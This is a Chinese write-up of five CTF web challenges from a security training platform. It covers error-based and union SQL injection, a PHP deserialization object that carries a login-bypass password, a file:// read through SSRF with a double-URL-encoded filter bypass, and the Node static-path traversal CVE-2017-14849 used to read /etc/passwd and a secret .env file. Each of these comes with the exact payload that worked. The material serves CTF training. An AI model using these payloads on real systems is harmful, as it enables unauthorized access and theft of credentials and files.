本文首发于“合天网安实验室” 作者：ch3ng

本文涉及知识点靶场练习：[CTF从入门到实践-CTF一站式学习平台-合天网安实验室](https://www.hetianlab.com/pages/CTFLaboratory.jsp?pk_campaign=freebuf-wemedia)

0x01 easy_sql

一开始看到是easysql，那就先上sqlmap跑跑看，跑出了数据库名security以及若干表名![](https://image.3001.net/images/20201125/1606283485_5fbdf0dd30ce6455302bd.jpg!small)

继续跑flag，结果没跑出来，最后还是上手工了。。。

测试输入一个单引号，页面无反应，但是在源码中发现了又报错信息![](https://image.3001.net/images/20201125/1606283497_5fbdf0e931234ca63a8b6.jpg!small)

接着用单引号和括号闭合，报错注入，之后想了一下，为什么页面没有回显呢，原来是因为错误信息居然显示白色，前期被骗了很久，用鼠标描一下即可看到

    
    
    uname=aaa') or updatexml(1,concat(0x7e,mid((select * from flag),1,25)),1)%23&passwd=bbbb

![](https://image.3001.net/images/20201125/1606283508_5fbdf0f458ad980f7e5c1.png!small)

uname=aaa') OR updatexml(1,concat(0x7e,mid((select * from
flag),23,50)),1)%23&passwd=bbbb

![](https://image.3001.net/images/20201125/1606283526_5fbdf1061b247fe775934.png!small)

0x02 ezsqli

开局一个输入框![](https://image.3001.net/images/20201125/1606283540_5fbdf11405c98b828a951.png!small)

查看hint得到源码

<?php

//a "part" of the source code here

function sqlWaf($s)

{

$filter =
'/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|<|;|"|\^|\||\
|\'/i';

if (preg_match($filter,$s))

return False;

return True;

}

if (isset($_POST['username']) && isset($_POST['password'])) {

if (!isset($_SESSION['VerifyCode']))

die("?");

$username = strval($_POST['username']);

$password = strval($_POST['password']);

if ( !sqlWaf($password) )

alertMes('damn hacker' ,"./index.php");

$sql = "SELECT * FROM users WHERE username='${username}' AND password=
'${password}'";

// password format: /[A-Za-z0-9]/

$result = $conn->query($sql);

if ($result->num_rows > 0) {

$row = $result->fetch_assoc();

if ( $row['username'] === 'admin' && $row['password'] )

{

if ($row['password'] == $password)

{

$message = $FLAG;

} else {

$message = "username or password wrong, are you admin?";

}

} else {

$message = "wrong user";

}

} else {

$message = "user not exist or wrong password";

}

}

?>

password被过滤了，usename没有过滤，使用联合查询，构造username和password返回admin即可

username=admin1'+union+select+'admin','admin','admin'%23&password=admin&captcha=LSOK

![](https://image.3001.net/images/20201125/1606283557_5fbdf125cc891568f7f97.jpg!small)

0x03 warmup

下载源码开始审计，在index.php中发现了unserialize，估计是考察反序列化的利用了

···

if (isset ($_COOKIE['last_login_info'])) {

$last_login_info = unserialize (base64_decode ($_COOKIE['last_login_info']));

try {

if (is_array($last_login_info) && $last_login_info['ip'] !=
$_SERVER['REMOTE_ADDR']) {

die('WAF info: your ip status has been changed, you are dangrous.');

}

} catch(Exception $e) {

die('Error');

}

} else {

$cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR'])))
;

setcookie ('last_login_info', $cookie, time () + (86400 * 30));

}

···

conn.php源码

<?php

include 'flag.php';

class SQL {

public $table = '';

public $username = '';

public $password = '';

public $conn;

public function __construct() {

}

public function connect() {

$this->conn = new mysqli("localhost", "xxxxx", "xxxx", "xxxx");

}

public function check_login(){

$result = $this->query();

if ($result === false) {

die("database error, please check your input");

}

$row = $result->fetch_assoc();

if($row === NULL){

die("username or password incorrect!");

}else if($row['username'] === 'admin'){

$flag = file_get_contents('flag.php');

echo "welcome, admin! this is your flag -> ".$flag;

}else{

echo "welcome! but you are not admin";

}

$result->free();

}

public function query() {

$this->waf();

return $this->conn->query ("select username,password from ".$this->table."
where username='".$this->username."' and password='".$this->password."'");

}

public function waf(){

$blacklist = ["union", "join", "!", "\"", "#", "$", "%", "&", ".", "/", ":",
";", "^", "_", "`", "{", "|", "}", "<", ">", "?", "@", "[", "\\\", "]" , "*",
"+", "-"];

foreach ($blacklist as $value) {

if(strripos($this->table, $value)){

die('bad hacker,go out!');

}

}

foreach ($blacklist as $value) {

if(strripos($this->username, $value)){

die('bad hacker,go out!');

}

}

foreach ($blacklist as $value) {

if(strripos($this->password, $value)){

die('bad hacker,go out!');

}

}

}

public function __wakeup(){

if (!isset ($this->conn)) {

$this->connect ();

}

if($this->table){

$this->waf();

}

$this->check_login();

$this->conn->close();

}

}

?>

可以看到在check_login中，有个flag的输出点，前提是我们需要伪造成admin用户

![](https://image.3001.net/images/20201125/1606283638_5fbdf176230b3b82bccde.png!small)

继续往下看，有个执行SQL语句的地方![](https://image.3001.net/images/20201125/1606283654_5fbdf18698ab17e70f0f6.png!small)

public function query() {

$this->waf();

return $this->conn->query ("select username,password from ".$this->table."
where username='".$this->username."' and password='".$this->password."'");

}

下面还有个waf，看了一下，发现我们需要构造的万能密码所用到的字符不会被ban

$blacklist = ["union", "join", "!", "\"", "#", "$", "%", "&", ".", "/", ":",
";", "^", "_", "`", "{", "|", "}", "<", ">", "?", "@", "[", "\\\", "]" , "*",
"+", "-"];

foreach ($blacklist as $value) {

if(strripos($this->table, $value)){

die('bad hacker,go out!');

}

}

所以这里我们可以利用SQL注入来变成admin登录，username改为admin，password为万能密码a' or '1'='1，代码如下：

<?php

include "conn.php";

$sql = new SQL();

$sql->table = "users";

$sql->username = "admin";

$sql->password = "a'or'1'='1";

$a = serialize($sql);

echo $a;

echo base64_encode ($a);

    
    
    得到TzozOiJTUUwiOjQ6e3M6NToidGFibGUiO3M6NToidXNlcnMiO3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MTA6ImEnb3InMSc9JzEiO3M6NDoiY29ubiI7Tjt9，输入之后获得flag

![](https://image.3001.net/images/20201125/1606283672_5fbdf19806a09a336a613.png!small)

0x04 ssrfME

访问可以看到有两个输入点，一个可以输入url，一个是验证码![](https://image.3001.net/images/20201125/1606283684_5fbdf1a4b0dde9eb48ed9.png!small)

脚本爆破验证码

    
    
    <?php
    for ($i=0; $i < 1000000000; $i++) { 
           $a = substr(md5($i), -6, 6);       if ($a == "d17b5b") {              echo $i;              break;       }
    }
    ?>

尝试使用file协议读取，发现读取/etc/passwd成功![](https://image.3001.net/images/20201125/1606283701_5fbdf1b509ad146489085.png!small)

读取/flag，没成功，尝试读取/var/www/html/index.php，得到源码，原来是有个waf过滤了flag

···

if (isset($_POST['url']) && isset($_POST['captcha']) && !empty($_POST['url'])
&& !empty($_POST['captcha']))

{

$url = $_POST['url'];

$captcha = $_POST['captcha'];

$is_post = 1;

if ( $captcha !== $_SESSION['answer'])

{

$die_mess = "wrong captcha";

$is_die = 1;

}

if ( preg_match('/flag|proc|log/i', $url) )

{

$die_mess = "hacker";

$is_die = 1;

}

}

···

file协议读flag，利用两个url编码flag绕过

url=file:///%25%36%36%25%36%63%25%36%31%25%36%37&captcha=43049![](https://image.3001.net/images/20201125/1606283711_5fbdf1bf05d3a38a35c5c.png!small)

0x05 SecretGuess

题目给了源码，但是不全

![](https://image.3001.net/images/20201125/1606283722_5fbdf1cace1e867e6a883.png!small)

在index.html中发现了source，点击可以看到源码

const express = require('express');

const path = require('path');

const env = require('dotenv').config();

const bodyParser = require('body-parser');

const crypto = require('crypto');

const fs = require('fs')

const hbs = require('hbs');

const process = require("child_process")

const app = express();

app.use('/static', express.static(path.join(__dirname, 'public')));

app.use(bodyParser.urlencoded({ extended: false }))

app.use(bodyParser.json());

app.set('views', path.join(__dirname, "views/"))

app.engine('html', hbs.__express)

app.set('view engine', 'html')

app.get('/', (req, res) => { res.render("index")

})

app.post('/', (req, res) => { if (req.body.auth && typeof req.body.auth ===
'string' && crypto.createHash('md5').update(env.parsed.secret).digest('hex')
=== req.body.auth ) { res.render("index", {result: process.execSync("echo
$FLAG")}) } else { res.render("index", {result: "wrong secret"}) }

})

app.get('/source', (req, res) => {
res.end(fs.readFileSync(path.join(__dirname, "app.js")))

})

app.listen(80, "0.0.0.0");

在给出dockerfile中，文件内容为

FROM node:8.5

COPY ./src /usr/local/app

WORKDIR /usr/local/app

ENV FLAG=flag{**********}

RUN npm i --registry=https://registry.npm.taobao.org

EXPOSE 80

CMD node /usr/local/app/app.js

去搜索相关内容，发现了可能会存在CVE-2017-14849漏洞

![](https://image.3001.net/images/20201125/1606283736_5fbdf1d8d99dfe39c5e43.jpg!small)

输入/static/../../a/../../..//etc/passwd，利用成功![](https://image.3001.net/images/20201125/1606283746_5fbdf1e2bffb4cfe58e9a.jpg!small)

接着去获取secret，/static/../../a/../../../usr/local/app/.env，得到secret=CVE-2017-14849![](https://image.3001.net/images/20201125/1606283755_5fbdf1eba336d012732cf.jpg!small)

根据源码中的条件

if (req.body.auth && typeof req.body.auth === 'string' &&
crypto.createHash('md5').update(env.parsed.secret).digest('hex') ===
req.body.auth )

我们将CVE-2017-14849进行md5加密之后提交即可获得flag，auth=10523ece56c1d399dae057b3ac1ad733

![](https://image.3001.net/images/20201125/1606283768_5fbdf1f8ca85eec08e65c.jpg!small)

